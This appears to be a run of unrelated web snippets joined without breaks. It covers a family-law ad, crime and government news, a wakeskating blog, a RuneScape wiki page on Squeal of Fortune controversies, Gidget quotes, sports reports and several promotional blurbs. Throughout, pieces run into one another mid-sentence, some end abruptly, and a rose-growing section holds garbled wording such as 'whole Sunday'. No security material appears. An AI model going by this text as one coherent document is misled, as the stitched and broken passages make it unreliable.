• Legal and Court Coaching
• Document Review
• Preparation of Documents
For example, if you are getting a divorce and you only want an attorney to help prepare the documents that you will need to file, the document preparation is an unbundled service.
Quite often, folks do their own divorce but find that the paperwork, particularly at the end of the process, is more burdensome than they had anticipated and find unbundled services to complete the process to be very helpful.
In another situation, one may derive great benefit from having an attorney draft a declaration as part of a Request for an Order or a Response to a Request for an Order. It is very important that these declarations be as clear and concise and as well written as possible while also conveying the relevant information that is important for the judge’s decision. Relevance is key, the only information a judge wants to see is information that is relevant to the issue to be decided and it is common for non-lawyers to add information that may be very important to them, but is not relevant in terms of the legal issue to be decided. Judge’s have volumes of material to read before hearing a matter and don’t like to have to read material that is not relevant and/or not well written. It is to a litigant’s benefit to provide written material that will not irritate the judge.
The Law & Mediation Office of Lorna Jaynes offers unbundled services to suit your needs and will help you evaluate whether using an unbundled service will work for you. Our compassionate services will provide you with the information you need to move on with your life, so contact us to learn more about these services.Arizona takes interest in NM murder defendant
LAS CRUCES, N.M. -- A Las Cruces man whose original conviction was overturned on appeal has pleaded guilty to second-degree murder in the death of one of two pedestrians he struck while driving recklessly in 2005.
A judge on Monday sentenced Jeremiah Dowling to 10 years in prison in the death of 57-year-old Sharon McNair, with the sentence to start once he finishes serving other prison sentences.
Dowling had been convicted of first-degree murder in McNair's death and sentenced to life in prison, but the New Mexico Supreme Court overturned the murder conviction.

In our first segment, John Dick, the University’s grounds manager, shows us some of what’s growing on campus.
Posted on August 1, 2013Virginia is for Lovers. So if you’re a hater, get out!
Well Scene One just had quite the little journey starting last Tuesday when we rented out two hybrid Priuses and drove those bad boys straight from Orlando, Florida to Smith Mountain Lake, Virginia. The occasion was BroStock 2008, a Liquid Force houseboat gathering and party on the lake last weekend. Our hosts were the Reeder brothers (Tommy and Brian), and we couldn’t have done it without them. Those two were born and raised in those beautiful hills and cool water of the great state of Virginia, so pretty much we had the best tour guides possible. They were even stopping off the side of the road on the way up and showing us winch gaps! In “Team Fire” a.k.a. the red Prius, we had Keith Lant, Roland Lugo, and myself. The brothers Reeder cruised in “Team Ice” a.k.a. the blue Prius. After nearly 12 hours of driving (through the middle of the night), we arrived at the lake around 9am. From there, it was all about the chillin’. We met up with the Liquid Force team later on, who I really got to say is pretty great, and they rented out a house for the first few days for the team to stay at until the houseboats were ready for the weekend. An event like this one was super low-stress on the riders and people involved. You could tell everyone was just looking to relax and take it easy, and that’s pretty much what happened (until the partying began at night). The easy-going atmosphere was perfect to attract newcomers to the sport and to keep a smile on everyone’s faces.
Without going into too much detail on the exact happenings of each night we were there, pretty much the most I can say is that the people of Virginia are just downright awesome. Every single person we met was extremely hospitable and generous with anything they owned. Thanks so much to everyone that we chilled with. I also want to put in a great word for Smith Mountain Lake. The lake has 500 miles of shoreline, and the majority of those miles seemed to be perfectly tucked away glassy riding spots. It was truly enjoyable and the weather was excellent the whole trip. The perfect waters made it nearly impossible for us to ever want to leave! Anyone that has ever ridden a board on the lake should feel fortunate to be a part of something so great.
On Saturday the local shop on the lake, Wake ‘n Skate, threw their annual grassroots contest, and the wakeskate division had a great number of guys that were riding pretty hard, especially considering the somewhat rolly conditions they were dealing with. It was sick seeing local talent like Zack Ashton and Joe Philips throwing huge wake to wake tricks and getting close to the oh-so-elusive kickflip. Andrew Fortenberry was in town from Florida to put down some impressive moves, like the contest favorite “toe shove to indy” and some other trickery to take the first place prize. Seeing a wakeskating scene in different states is one of the raddest things to witness, and it really proves to me how important it is that wakeskating grows and spreads throughout the world. We all owe it to our sport to help it grow as much as possible and spread the joy of riding on the water without bindings to the rest of the world. Start your own scene and spread the stoke.
As far as actual wakeskating went the whole weekend, the most important thing to know is how hard Danny Hampson shredded during a contest intervention period. I’m pretty sure Danny walked down to the dock not even upon his own will, but rather was the victim of the flying whims of an intangible spiritual magnet coming from deep within the lake, summoning him to grab his gnar bar and make some magic happen. Danny got pretty footloose and fancy free within a mere three passes, sticking crazy wake to wake lines first try, like a heelside late front big to switch heelside late front shove to heel front three, then turning around and stomping the crap out of the cleanest late front 3 shove wake to wake that he claims he has ever done. It was truly an honor to witness such talent in action. Thank you, Danny.
As far as the rest of the trip, well there was lots and lots more hanging out and “dancing with the stars,” as I like to call it. SML pumped it up pretty hard and heavy, and we couldn’t thank her enough. Here’s to next year.

Salah also responded to the statements
attributed to Pope Benedictus XVI, who quoted Byzantine Christian Emperor Manuel Paleologos II, saying that the Prophet Muhammad only brought evil to the world.
“I hope it was a slip of the tongue, because if it is not, his words are a direct call to the nations of Europe to stand behind President (George) Bush and Israel in their war against Islam,” Salah said.- Exchange: Tokyo

Updated
The Western Australian Treasurer Troy Buswell says up to 300 public servants are likely to accept the State Government's latest redundancy offer.
It is the second round of voluntary redundancies the government has put in place, after 469 employees took up the offer last year.
Mr Buswell says assisting surplus employees to leave the public sector, helps ensure taxpayers' money is being used properly.
"We have an obligation to effectively and efficiently deliver public services," he said.
"My view is there are too many people engaged in that process, in particular, too many people who are not on the front line of delivering those services".
"We have and we will continue to make changes where we can deliver more efficient outcomes".
He says the forthcoming state budget will include $30 million to pay for the redundancies.
Protect frontline jobs: Ripper
The Opposition leader, Eric Ripper says the Government should guarantee that no front-line services will be affected by the redundancies.
"Just because someone is not a teacher or a nurse doesn't mean that their service isn't a valuable one needed by the public, so there are people other than teachers, nurses and police officers who provide valuable services, for example in child protection, or in disability services, or in environmental protection," he said.

During a Social Media Week panel on Tuesday (Feb. 14), which asked "Are We in a Post-Consumer Age?," Peter Weijmarshausen, CEO and co-founder of 3-D printing and design company Shapeways, said his company allows people to take part in the design process—which ultimately creates a stronger relationship with their products. While the technology the company employs is still in its infancy, he said, it already allows people to customize products like jewelry and accessories and ceramic cups.
"[We] want to be involved in the products that we care about," he said. "[This] enables people to rediscover the value of the goods that they buy."
Bradford Shellhammer, co-founder and chief creative officer for design-centric online retailer Fab.com, said he doesn't think people necessarily need customized goods, but agreed that consumers would rather have products that have a history.
"I think more people want to have stories about the things in their life," he said.
On Fab.com, that means consumers can browse product descriptions that include the designers' commentary and interesting bits about the products' origins, rather than just basic size information and shipping price estimate. But Shellhammer said that product "stories" can include the tale of how someone found a pair of jeans or, simply, that the jeans themselves fit perfectly.
On Etsy, an e-commerce hub for handmade goods, creative director Randy Hunt explained that consumers and creators can communicate directly without the "sanitizing" effects of corporate public relations, therefore creating their own narrative around the products.
In launching Fab.com eight months ago, Shellhammer said their hunch was that people want context around their products and, with 2 million members, it seems their theory is bearing fruit.
"I hope there's this backlash to Walmart and these other retailers dictating what everyone is wearing [and] shopping," he said.
Not everybody agreed that shoppers will always seek out a deep back story when picking out a pair of slacks. While Cliff Kuang, founding editor of Co.Design, said that great products should be placed within the context of their peers, he doubted the value of stories around all products. For example, the story behind Apple's iPad is "a really sad one," Kuang said—likely referring to the low-cost overseas labor Apple is reported to have employed to produce its popular phones and tablets.
Ultimately, whether emerging technology lets people customize their own products or learn more about the designers and stories behind them, said Shellhammer, "The consumer feels empowered to make the choice."Meredith Model & Talent Agency, Inc. is one of the most prominent talent agencies in the Midwest. Meredith opened in 1977 in New Jersey under the direction of Joyce Meredith, a Minneapolis girl who began modeling at the age of fourteen before continuing her career in the East. Meredith Model & Talent, which Joyce began out of her home, went on to become one of the most respected agencies on the East Coast. The agency philosophy was based on what Joyce cares about most - integrity, perseverance and compassion. These qualities aided many aspiring models to succeed in their careers. In 1987 Joyce set a precedent by winning a lawsuit against the New Jersey Department of Labor to guarantee models the right to be independent contractors, ensuring that they would always be free to work with the agency of their choice. Joyce remains active in major contract negotiations and serves as a consultant for Meredith Models East in New Jersey and Meredith Model & Talent Agency, Inc. in St. Paul, Minnesota.
In March of 1991, Stacy Meredith left her career in advertising and photography in New York City and opened a second office, Meredith Model & Talent, Inc. in St. Paul, Minnesota. Her goal has been to continue her mother’s tradition of leadership by providing superior quality and professional service, while maintaining the highest ethical standards. With its continual presence as a leader in the Midwest for models and actors,.
Meredith’s professionalism, effective and clear communication and a dedicated and focused vision are qualities that the agency executes with all its talent and clientele.I have to get a new iPhone 4s tomorrow due to battery issues.

Grow beautiful roses in your yard. It’s easy with these tips.
Roses are some of the most beautiful garden plants around. They offer lush romantic blooms in just about every color you can imagine and many are delightfully fragrant. Use these simple tips to grow gorgeous healthy roses in your yard. The 1st step is to select the right roses for your climate. Do a little research to find out the varieties that are best suited to where you live. This is an important step because, roses that aren't suited to your area, cannot survive the winter or will suffer from lots of pest and disease problems. Also, look for disease-resistant varieties such as easy elegance roses or knockout roses. The best place to grow roses in your yard is one that sees whole Sunday or at least 6 hours of direct light or day. The more sun, the better. Unfortunately, while some roses will tolerate some amount of shade, there are none that will thrive in shade. It's also important to plant your roses in open spot where there's good air flow for this helps prevents disease. When planting roses, make sure there's plenty of room between each other and between other plants so that the breeze can flow freely. Roses love a little mulch from the soil over their roots. A couple of inches of mulch which are weeds helps keep diseases from splashing up on the leaves and allows the soil to hold moisture better during times of drought. When you plant roses, be sure to enrich the soil with organic matter such as compost. A healthy layer of compost helps the soil hold moisture and nutrients better and encourages beneficial microbes in the soil. They encourage your roses to grow better and resist<<Freddie Mac's plan for foreclosures hits roadblock
McLean-based Freddie Mac is in a tug of war with its regulator, the Federal Housing Finance Agency, and Wall Street over its plan to provide loans to investors that are buying homes in foreclosure to rent them out, The Wall Street Journal reports.
The government-backed mortgage giant is pushing to finance such investors to help jump-start a housing recovery. But the FHFA has put those plans on hold, concerned Freddie's cheap debt would make it difficult for banks to compete for the growing number of buyers of foreclosed homes. The FHFA also worries Freddie's involvement would deepen the government's role in the nation's real estate economy.Las Vegas hotels for less

(Mar. 20, 2004) - Junior Kim Simmons (Knoxville, Tenn.) and freshman Joshua Hicks (Riceville, Tenn.) both had strong performances in the 800 meters in East Tennessee State's first outdoor meet of the season. ETSU's track and field team opened its outdoor season this weekend with the completion of the Charlotte 49er Classic held in Charlotte, N.C. Simmons placed fifth overall with a time of 2:15.79, while Hicks recorded a time of 1:55.41 for a 13th place finish. Both times were the Buccaneer athlete's personal bests. Freshman Anna Marie Riccardi (Canfield, Ohio) made a strong debut in this weekends meet. Riccardi, who just finished up the women's basketball season with the Lady Bucs, placed sixth in the high jump with a mark of 1.63m. Riccardi also ran well in the 100 meter hurdles with a time of 16.31. "I'm very pleased with Anna's performance in her first meet," said assistant coach Michelle Byrne. In the men's long jump, David Cabbler (Roanoke, Va.) and Kaylin Chesney (Knoxville, Tenn.) had solid performances. Cabbler finished with a distance of 6.63m, while Chesney completed a 6.53m jump. "Overall, in the first meet of the season the expectation is that we would have performed at a higher level across the board," stated Byrne. "Still, we have these early meets so we can see what we need to improve upon before we go to conference. So, now we know what we need to work on."(Australia 1968 – )

Michael Cook is a photographer who worked commercially both in Australia and overseas for twenty-five years. In 2009, Cook was drawn into art photography by an increasingly urgent desire to learn about his Aboriginal ancestry and identity. As a child, Cook was adopted and raised by a non-Indigenous family. Although they were not Aboriginal, they were active in their support of Indigenous rights. He said, 'I was raised with a strong understanding of my Aboriginal ancestry thanks to my parents. When I produce art, I feel a stronger connection with my ancestry. This helps me to understand Australian history-in particular, my history.'
Drawing upon his many years of experience as a photographer within the commercial fashion industry, he employs photographic layering to build his images. Also, he characteristically works in photographic series, his unfolding tableaux offer insolvable narratives which are not prescribed but left open to interpretation.
'Majority rule' 2014 is a landmark series by Cook in which he creates scenarios as a way of questioning Australian history and the dominance of those in power. Within each work, the character's multiplicity signifies the non-reality of the image created. The works are poignant reminders of the lack of Indigenous representation with Parliament, the judicial system and the business world, as well as the lack of acknowledgement of Indigenous people who have been members of our military.

TitleHound is a title insurance rate engine that searches and electronically delivers the lowest available rates to provide lenders with up front access to settlement fees, mortgage taxes and recording fees, and assist with new borrower disclosure regulations. Borrowers benefit by having accurately quoted settlement fees when they submit mortgage applications.
Pursuant to the agreement, Linear Title is licensing NexGen's TitleHound technology to maximize efficiency and compliance and provide a needed solution for lenders facing the challenges of the new Mortgage Information Disclosure Act (MDIA) as TitleHound produces a Settlement Fee Certification. The new changes presented by the MDIA expand the scope of Truth in Lending disclosures for mortgage transactions to include refinances and mortgage loans on all dwellings in addition to the disclosures already required for purchase and initial construction loans.
Revised disclosures are required if the annual percentage rate (APR) changes by one eighth percent or more during the loan process. Because of this regulation, lenders must delay closings for three additional days while waiting for borrowers to receive the revisions. NexGen's TitleHound provides lenders with all required information delivered electronically by the title agent, thereby shaving days off the closing process.
"Accelerating the closing process in a compliant manner is a benefit to both lenders and borrowers," said Nick Liuzza, CEO of Linear Title. "For lenders, it locks in interest rates, discourages borrowers from switching to another lender and generates interest sooner. By delivering all title fees, premiums and government charges up front electronically, borrowers can close their loans earlier while taking advantage of the lowest prices."1516. gay -- a valley...

The Third Meeting of the Sixth Replenishment of the Global Environment Facility (GEF-6) is scheduled to take place in December 2013. Representatives from donor countries, non-donor recipient countries, civil society, GEF agencies, the Trustee, the Scientific and Technical Advisory Panel (STAP), and the Evaluation Office are set to attend.The fingers signaled the pair's one-two finish as Zyemtsev won Sunday's ESi Ironman 70.3 Augusta.
"It's my first 70.3 title. It's great," said Zyemtsev, 38. "I pushed a lot harder the last couple miles."
Zyemtsev, who trains in Florida and New Mexico, finished third last year and improved two spots with his 3:47.15. Defending champion Kriat, who said he has been friends with Zyemtsev for more than 10 years, clocked in at 3:49.34, while Tim Berkel came in third a little more than two minutes behind Kriat.
Emma-Kate Lidbury, 31, of the United Kingdom was the top woman, posting 4:19.31, more than six minutes faster than Amanda Lovato, of Boulder, Colo., who came in fourth last year.
Augusta Mayor Deke Copenhaver finished in 6:19.26.

The first participants hit the water at 7:30 a.m., swimming for 1.2 miles in the Savannah River before moving to the bike portion, which lasted 56 miles and crossed into South Carolina. After that came a 13.1-mile run.
After some light rain at the start of the competition, there were cloudy skies until the sun came out a little before 11 a.m. After a few hours of sun, the clouds and some rain returned with lightning. The competition was stopped at 5 p.m. because of the weather.
A race official said at least three competitors were sent to the hospital because of heat-related problems.
Brinsley Thigpen, the Augusta Sports Council's chief executive officer, said she was pleased with how the day went.
More than 3,000 people competed, and many were cheered on by family and friends. Watchers were armed with their voices, noisemakers like vuvuzelas and held cameras.

Some onlookers held signs or stood out with specialized shirts reading "Nice legs!" and "My hubby is my Ironman."
Christina Cusack was there to watch her boyfriend, Jon Clark, who lives in Florida. Competing for the second time in Augusta, Clark suffers from seizures but drank a lot of fluids and rested after his most recent seizure.
Cusack said Clark felt fine Sunday morning, so he decided to race. He finished at 6:37.59.
"He really is my Ironman in every way," Cusack said.
As for the leaders, Zyemtsev quickly made up ground on the five-minute edge Kyle Leto had entering the run stage.
Zyemtsev finished the run in 1:13.20. Kriat, 27, ran it at 1:15.44, but he had to battle to get to the end.
"How far is it? How far is it?" Kriat said he remembers thinking over the last two miles.
Lidbury also won the Ironman 70.3 Mallorca and the Ironman 70.3 UK this year. She said she moved into the lead Sunday on the fifth mile of her run.
Lidbury also had an inauspicious start, missing the part where she was supposed to come out of the water. She said she swam past the start of the transition area before correcting and going on to another victory.
Once she reached the end, she raised the tape over her head like a championship belt.
"It's topping off a really great year," she said.Squeal of Fortune/Controversies
< Squeal of Fortune
this wiki
On 2 April 2012, Jagex added the ability to buy Squeal of Fortune spins with real money, causing several controversies. Some players were enraged by this new update and started a riot in Falador, World 66. In response, Mod William posted a thread on the forums about this new update on the Recent Game Updates article, and within a day this resulted in thousands of negative posts by furious players demanding its removal.
Real world tradingEdit
Of the claims against the Squeal of Fortune's legitimacy, real world item trading is the most heated. The introduction of purchasing spins was viewed as a larger step towards directly selling items. It set a precedent of being the first Jagex-endorsed means to "sell" items to players for real world money. Similar controversies had existed beforehand — the Members Loyalty Programme and Vanity items. The Squeal of Fortune's implementation of micro-transactions differs from these previous two, however; where as the Squeal of Fortune allowed for direct purchase of spins that guarantee winning an item of any sort, the Members Loyalty Programme provided a new currency with which items could be purchased, but, at that time, the currency was only available as incentive for being a paying member. Vanity items were similar in implementation; the items were not directly purchased with money, but rather were received along with membership as an added "thank you" from Jagex.
Along with the direct purchase of a guarantee item was the controversy regarding some of the possible items, namely the lucky equipment and experience lamps. The Squeal of Fortune set a precedent of being the first micro-transaction to provide a source of high-end gear and experience. The Members Loyalty Programme provided the then-new auras, but they were limited in their use and provided relatively small advantage. Similarly minute advantage was received from vanity items such as the ornate katana which, at the time, had stats equivalent to an iron 2h sword. The complaints against Members Loyalty Program and vanity items have mostly disappeared. However, those against the Squeal have not. Even before the introduction of purchasing spins, there was a controversy that surrounded the lucky items. Players either believed that the items would be tradeable and thus provide large amounts of "unearned" income or that the items would be common enough to create an abundance of these items and ruin the economy of their tradeable counterparts. Further disdain was aimed at the ability to purchase spins providing a chance, albeit slim, of receiving high level, generally expensive gear without "playing the game".
Three promotions in particular have supported the idea that the Squeal is a form of Real-World Trading: both of the Alchemist's amulet promotions and the Samid's gloves promotion. Both of these promotions give large quantities of gold, with an obvious advantage to those who have bought spins. The amulet can give up to about 5 million coins if formed with 10 amulet fragments (first promotion) or 10 fragments and a Transmutation tablet (second promotion). Samid's gloves can give 2-5 million coins, depending on total level. Neither promotion included a limit on the number of amulets or gloves that could be obtained.
Most notable is the controversy that surrounds the ability to indirectly purchase experience in skills. Lamps exist on the wheel as fairly common prizes as well as rarer prizes that have increased reward with all lamps providing modest amounts of experience. Experience lamps are common enough for a large sample of spins to constitute a significant, if not majority, portion of the total rewards won.
Even further was the response by Jagex. As Jagex are the owners of the game, they claim legal ownership of all intellectual property — accounts, items, etc. A response by Mod Mark Gerhard asserted that the total revenue from the Squeal and Solomon's General Store was between one-tenth and one-fifteenth of what could be made by selling experience directly but that it would be a path they will avoid for the sake of the game. He continued to say that the generated revenue was being put into the game to support updates such as HTML5 and cross-platform playing. Gerhard asserts that micro-transactions exist as a means to ensure that financial support for RuneScape can continue and grow.
Controversy also arose from a claim that 90% of members enjoy the wheel and 70% of free-players use it daily. The claim that such a large portion of the community enjoys the content was cause for much anger and was only furthered by using that data to call the Squeal "some of the most widely appreciated content release[d] to date". Within this response, Gerhard also refuted the claims of it violating any real-world trading rules or real-world gambling laws or providing an unfair advantage for players "to buy their way to success"; he states the system is designed against these and that such are impossible. Gerhard cites past updates in this response to reassure their careful consideration and scrutiny with implementing the Squeal (as well as any update) in making sure it has no outstanding negative impact and does not undermine player achievement. Citing several planned updates (including the then-upcoming Evolution of Combat), Gerhard implies that larger upgrades to the game would not be possible without the financial support from these micro-transactions.
On 5 April 2012, Jagex changed redefined their rules on real-world trading to explicitly restrict trading of items facilitated by a third-party but not those which are performed through a means within the game itself.[1]
GamblingEdit.
Legal viewpointEdit
In Australia, the gambling issue centres around the interpretation of relevant legislation, in Australia's case the Interactive Gambling Act (2001). The regulator, the Australian Communications and Media Authority, is of the opinion that virtual items are defined as having no monetary value, and thus, the prizes are worth nothing and that gambling is not taking place.
As of April 2013, there are two processes taking place. Senator Nick Xenophon is introducing legislation that changes this decade old legislation to cover new eventualities such as the gambling in RuneScape, Slotomania and DoubleDown, specifically mentioning RuneScape. The other process is an ongoing review of a report on the Interactive Gambling Act, 2001. This report concluded on 12 March 2013, and one of the recommendations was that the Department of Broadband, Communications and the Digital Economy should work out "potential measures to address the access and marketing of online gambling-style services to children".[2] Senator Stephen Conroy, the then Minister for Broadband, Communications and the Digital Economy, was responsible for this ongoing review.
For RuneScape, the implications are that Squeal of Fortune may become inoperable, at least in Australia, because virtual items do have value. On the other hand, it would be difficult for Australia to enforce any such ban as Jagex is based in the United Kingdom.[source needed]
Financial securityEdit
If a member is paying by credit card, and the credit card information has been saved with Jagex, there originally was no identity verification between clicking the in-game "buy spins" button and confirming the transaction. This means that someone with unauthorised,[3][4] effective facilities available to reverse charges for disputed transactions. As of a patch note update, however, the security around buying spins has been "tightened".
PrecedentEdit.
This has already been realised with the introduction of bonds, which allows players to buy bonds with real world money which, in turn, could be directly sold to other players for coins.."
Player reactionsEdit
Despite RuneScape's long history of fighting against real world traders, some players believe that RuneScape may soon become insolvent as Jagex is seemingly rewriting their previous rules.
Within the first week of spin-selling, over fifteen thousand players voiced their objections to the Squeal. Insults for the Squeal are still seen in current times with the most prevalent being the "Steal of Fortune", "Wheel-World Trading".
Adding to the controversy was the Gambling and Games of Chance offence, which is seen as even more hypocritical on Jagex's part as they allow only their form of gambling while banning others. This particular update was very popular with most players, apart from those few actively gaining from games of chance and the scamming involved around it.
Jagex responseEdit
On 14 August 2012, Mod Timo responded by giving this quote about the controversy surrounding the SoF and Solomon features:
Two weeks after Mod Timo replied to players on the forums about SoF and Solomon's Store, Mod MMG posted his response about the two features of the game in a news post on the RuneScape website.[6] On the forums related to this post, Mod Michelle used Mod MMG's quote rather than him addressing his own post.[7] The forums had a mixed response on the message as well as some players wondering why Mod Michelle was using Mod MMG's quote. Along with speaking about the two features, he also spoke of another bot-nuke day appearing within the upcoming months (Optimus Part 2) as well as an update through graphics with HTML 5 (Runescape 3). Some players accused the message as being a way for Jagex to gain the trust back from the players who despise the two features while others praised it as being a great way to eradicate bots from the game as well as to improve it graphically.
On 5 April 2013, after the Samid's Glove SOF update, people on the forums were outraged enough that Mod Lods started to try to calm them down and answer questions. The most controversial quote about SOF was said in response to a player named LordCromwell. After arguing that RuneScape has become a Pay-To-Win game and that working for what you want is how the game was meant to be, Mod Lods had this to say:
"I'm sure you feel far more satisfaction from actually taking the time and effort in game to achieve things like this LordCromwell, this is just an alternative option for players" - Mod Lods[8]
This caused an uproar among others and showed to some that this quote confirmed that SOF was in the game to allow players who bought spins to have an advantage within the game among others. After this was said, all quotes from Mod Lods afterwards were almost entirely targeted to positive feedback and questions.

Gidget is a fictional character created by author Frederick Kohner (1905-86), based on his teenage daughter Kathy (now Kathy Kohner-Zuckerman) in his 1957 novel, Gidget, the Little Girl with Big Ideas. The novel follows the adventures of a teenage girl and her surfing friends on the beach at Malibu. The name Gidget is a portmanteau word of "girl and midget".[1] Following the novel's publication, the character appeared in several films, television series and telemovies.

The Novels[edit]
Frederick Kohner wrote eight "Gidget" novels, six of them original novels, two of them novelizations based on motion pictures with the same titles.
Gidget, the Little Girl with Big Ideas (1957)[edit]
"I'm writing this down because I once heard that when you're getting older you're liable to forget things and I'd sure be the most miserable woman in this world if I ever forgot what happened this summer."[1]
- chapter one, first sentence (p.3 in current edition)
"All things considered--maybe I was just a woman in love with a surfboard."[1]
- chapter fifteen, second last sentence (p.154 in current edition)
Cher Papa (1959)[edit]
"He gave this a moment of thought.
"Then he said, 'In love--I don't think I am. But I do like Franzie. I liked her from the day I saw her for the first time, out at Malibu on the board. She's got spunk and spirit. She's got warmth and enthusiasm. And--' he smiled diffidently, 'I like her particularly because I know that she likes me.'
"I admit I was quite fascinated by this bit of self analysis.
"'I am always ready to like a girl who likes me,' the Kahoona went on. 'You see, I am basically a shy person. It's always been hard for me to believe that a woman really liked me. So if it happens--well--I really want to hold onto it.' "[2]
- chapter five
- N.B. Cher Papa is unique among the novels in that it is narrated by Gidget's father rather than Gidget (Franzie) herself; the above quote is excerpted from a conversation between Gidget's father and the Kahoona. It is included because it speaks to the nature of Gidget as a human being, and the nature of her close friendship with the Kahoona.
Gidget goes Hawaiian (1961 novelization)[edit]
"My friend the great Kahoona once told me that the sea is where we came in, and the sea is where we go out. We have crawled out of the sea and one day we're going to crawl back into it. That solution of salt is in our blood."[3]
- chapter seven
The Affairs of Gidget (1963)[edit]
"All the short years of my life I have been fascinated by the word 'affair.'
"It sounds so decadent.
And when I say short years, I say so advisedly. They have been painfully short, fifty-nine inches to be precise and that's stretching it."[4]
- chapter one, first few sentences
"If you want to believe the Arabs, there are three things you can't hide: love, smoke and a man riding on the back of a camel.
"I have news for the Arabs.
"They have left out one other thing, and that thing is a toothache."[4]
- chapter twelve, first few sentences
Gidget Goes to Rome (1963 novelization)[edit]

Gidget in Love (1965)[edit]
"The bluebird of happiness had come home to roost. If this isn't heaven, I thought, lingering in his sweet embrace, I ask you, what is?"[6]
- chapter fifteen, last two sentences
Gidget goes Parisienne (1966)[edit]
"Everything was about to begin.

- chapter twenty-two, last several sentences
Gidget Goes New York (1968)[edit]
Films[edit]
Gidget (1959)[edit]
- "Surfing is out of this world. You can't imagine the thrill of the shooting the curl. Well, it positively surpasses every living emotion I've ever had."[9]
Gidget Goes Hawaiian (1961)[edit]
- "Something happens to parents when they have children; they forget that their kids are human beings...you show me one kid that'll go out of his way to become involved with his parents!"
- "But that's not the way it's supposed to go; I can't even be a good fallen women."
Gidget Goes to Rome (1963)[edit]
- "I want my epitaph to read: Here lies the only American Girl who ever came to Rome without tossing a coin in the fountain."

Heartbreak Hawkeyes: The headline game of the week was as good as advertised. Ohio State clashed with Iowa in a back-and-forth heavyweight fight on Senior Day at Kinnick Stadium. In the end the two teams each did what they do best – Ohio State came from behind to pick up a win in dramatic fashion at the expense of the Hawkeyes who dropped their fourth game in the final four minutes.
Terrelle Pryor overcame a shaky performance to lead the Buckeyes on the decisive drive which featured a game saving 4th-and-10 conversion and Dan Herron’s go-ahead touchdown with 1:47 remaining in the ball game which put Ohio State up 20-17. The usually-clutch Ricky Stanzi could not pull off his magic on the Hawkeyes final drive. When the clock struck zero Jim Tressel breathed a sigh of relief knowing that his team is one win away from at least a share of a sixth straight Big 10 title.
Iowa played well in this game, but the defense could not clamp down in the end. Pryor, Herron, Dane Sanzenbacher and the powerful Buckeye offensive line wore the Hawkeyes down in the fourth quarter. I’m sure things would have been different had Iowa running back Adam Robinson been at full strength and didn’t have to miss a quarter due to “academic punishment”. However there’s no downplaying the gutty, gritty win that Ohio State was able to come away with in hostile territory.
Razorbacks Escape Starkville: This game featured a lot of yards (974), a lot of turnovers (6) and a lot of excitement. We saw big play after big play and a whole lot of twists and turns. Mississippi State nearly had a 2-to-1 advantage in time of possession yet they fell 38-31 in double overtime to Arkansas.
In a game that was filled with back-and-forth action, it was quarterback Chris Relf (324 total yards) who led the Bulldogs on a drive that resulted in Derek DePasquale’s game tying 25 yard field goal at the end of regulation. In overtime is where it got crazy… We saw Bulldogs running back Vick Ballard – who was brilliant on the night (156 yards, 3 TD’s) – fumble out of the endzone for a touchback… Then we saw Razorback kicker Zach Hocker miss a makeable 39 yard field goal…
To double OT we went, and all-world quarterback Ryan Mallett said “enough’s enough.” He drove the Razorbacks in for what turned out to be the game winning touchdown. He hooked up with Knile Davis for the decisive which was fitting because those two were really the stars of the game for Arkansas – Mallett threw for 306 yards and 3 TD’s and Davis totaled 191 yards and 3 scores.
Big House Taken Over By Badgers: Wisconsin put on a show on Saturday against Michigan in Ann Arbor. They were without running back John Clay but Montee Ball and James White proved to be an unstoppable duo, combining for 354 yards and 6 touchdowns in the 48-28 thrashing.
The Badgers led 24-0 at half and despite scoring two quick touchdowns to start the third quarter, Michigan dug their own grave with dumb turnovers thanks to Denard Robinson who once again was kept in check – Although he did become the first ever to eclipse 1,500 rushing and passing yards in the same season.
What let Michigan down the most?… Their defense. Shocker, I know. The Wolverines have one of the worst defenses in the country and we once again saw why on Saturday. Scott Tolzien barely threw the ball. Wisconsin just kept running it. Michigan knew exactly what was coming – they just couldn’t stop it.
Sloppy ‘Huskers Fall in College Station: Nebraska lost to Texas A&M 9-6 and this shouldn’t be looked at as an upset. Anybody who’s watched the Aggies knows that they were red-hot ever since the quarterbacking switch to Ryan Tannehill. Most importantly, A&M had the type of defense that was needed to slow down the ‘Huskers.
Nebraska certainly didn’t help its cause much. They created a new definition to the term “undisciplined,” as they committed 16 penalties for an astounding 145 yards. Yes, Taylor Martinez was playing hurt and hasn’t been himself, but there’s no excuse, whenever a team commits 16 penalties they don’t deserve to win. That’s the bottom line.
Hokies Capture ACC Costal Division: Virginia Tech won their ninth straight game, knocking off the Jacory Harris-less Hurricanes 31-17 at Miami. It’s the Hokies longest winning streak in 11 years. Canes backup quarterback Stephen Morris was in way over his head, throwing 3 interceptions – part of 6 Miami turnovers.
Hokie running back Ryan Williams had his best performance of the season rushing for 142 yards and 2 touchdowns on just 14 carries. The game was tight until the fourth quarter when Virginia Tech just took over. Williams hit on an 84 yard touchdown run, soon followed by Tyrod Taylor’s 18 yard scamper to pay dirt.
The Hokies outscored the Canes 14-0 in the final quarter en route to a win that was more convincing than the final score would indicate. The score however wasn’t the ugliest part of this game for Miami – not even close. That honor goes to the uniforms the Canes were wearing. One word – sickening.
Huskies One Step Closer To BCS: With Connecticut’s 23-6 bashing of Syracuse they are now in prime position for the conference championship and the automatic BCS bid. West Virginia takes on Pittsburgh in the Backyard Brawl in Pitt on Friday. If the Mountaineers win and UConn takes care of their business, the Huskies will be top dogs.
They took apart the Orange with dominant defense (235 yards allowed) and an overpowering offensive line effort which allowed Jordan Todman to rush for 130 yards and 2 touchdowns. Syracuse shot themselves in the foot with 2 bad turnovers including one on their own four yard line. Rob Long’s punting also didn’t help matters.
Randy Edsall coached a hell of a game and was his usual-aggressive self going for it on two fourth downs and converting both. The Huskies have now won 4 in a row against Syracuse and 5 in the 7 all-time meetings. Things are really starting to come together for this team.
Quick Hits…
– Death, taxes and LSU getting lucky. Those are life’s only guarantees. The worst 1-loss team in the land squeaked by Mississippi 43-36 thanks to Stevan Ridley’s game winning touchdown with 44 seconds left.
– 3-touchdown favorite Michigan State avoided disaster against Purdue. Powered by a gutsy performance by the banged up Kirk Cousins, the Spartans outscored the Boilermakers 22-3 in the fourth quarter to come away with a 35-31 victory.
– Yankee Stadium proved to be perfect for football. The new cathedral looked beautiful as Notre Dame beat down Army 27-3 in front of a full and lively crowd.
– Wrigley Field proved to be not nearly as accommodating as Yankee Stadium as Illinois beat down Northwestern in Chicago. Both teams had to drive in the same direction because of the wall being so close to one of the endzones.
– Wide receiver Mark Harrison hauled in 240 yards and 4 touchdowns in Rutgers 69-38 loss – I repeat, loss – to Cincinnati. What’s more ridiculous…giving up 69 points, or having a receiver rack up 240 yards and still lose?
